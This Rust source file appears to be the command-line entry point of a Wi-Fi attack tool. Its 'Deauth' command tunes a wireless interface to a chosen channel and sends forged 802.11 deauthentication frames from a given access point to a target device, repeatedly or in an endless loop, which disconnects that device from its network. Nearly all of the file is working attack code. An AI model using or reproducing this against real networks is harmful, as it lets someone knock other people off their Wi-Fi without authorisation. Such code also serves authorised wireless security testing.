use std::{thread, time::Duration};

use airctl::{af_eth, helper::channel_to_freq, nl_gen};

use clap::{Args, Parser, Subcommand};

#[derive(Parser, Debug)]
#[command(author, version, about)]
pub struct Cli {
    #[command(subcommand)]
    pub command: Commands,
}

#[derive(Args, Debug, Clone)]
pub struct WirelessArgs {
    #[arg(short, long)]
    pub interface: String,
    #[arg(short, long)]
    pub channel: u16,
    #[arg(short, long)]
    pub target: String,
    #[arg(short, long)]
    pub bssid: String,
    #[arg(short, long)]
    pub gap: Option<u64>,
    #[arg(short, long)]
    pub repeat: Option<usize>,
}

#[derive(Subcommand, Debug)]
pub enum Commands {
    Deauth {
        #[command(flatten)]
        args: WirelessArgs,
    },
    Beacon {
        #[command(flatten)]
        args: WirelessArgs,
    },
    Stop,
}

fn main() {
    let cli = Cli::parse();

    let command = cli.command;

    match command {
        Commands::Deauth {
            args:
                WirelessArgs {
                    interface,
                    channel,
                    target,
                    bssid,
                    gap,
                    repeat,
                },
        } => {
            let target = parse_mac(&target);
            let bssid = parse_mac(&bssid);

            let mut af_ctrl = af_eth::Ctrl::new(interface.clone());
            af_ctrl.sock_bind();

            thread::sleep(Duration::from_millis(200));
            let mut nl_ctrl = nl_gen::Ctrl::new(interface);
            nl_ctrl.bind();

            let freq = match channel_to_freq(channel) {
                Some(freq) => freq,
                None => panic!("Unsupported channel: {channel}"),
            };

            nl_ctrl.set_frequency(freq);
            af_ctrl.drain();

            match (gap, repeat) {
                (None, Some(r)) => {
                    for _ in 0..r {
                        af_ctrl.deauth(target, bssid);
                        println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
                        thread::sleep(Duration::from_millis(500));
                    }
                }
                (Some(g), Some(r)) => {
                    for _ in 0..r {
                        af_ctrl.deauth(target, bssid);
                        println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
                        thread::sleep(Duration::from_millis(g));
                    }
                }
                _ => loop {
                    af_ctrl.deauth(target, bssid);
                    println!("Deauth Packet sent: {:?} -> {:?}", bssid, target);
                    thread::sleep(Duration::from_millis(500));
                },
            }
        }

        _ => {}
    }
}

fn parse_mac(s: &str) -> [u8; 6] {
    let parts: Vec<&str> = s.split(':').collect();

    if parts.len() != 6 {
        panic!("MAC address must contain 6 bytes");
    }

    let mut mac = [0u8; 6];

    for (i, part) in parts.iter().enumerate() {
        mac[i] = u8::from_str_radix(part, 16)
            .map_err(|_| format!("Invalid MAC byte: {part}"))
            .unwrap();
    }
    mac
}
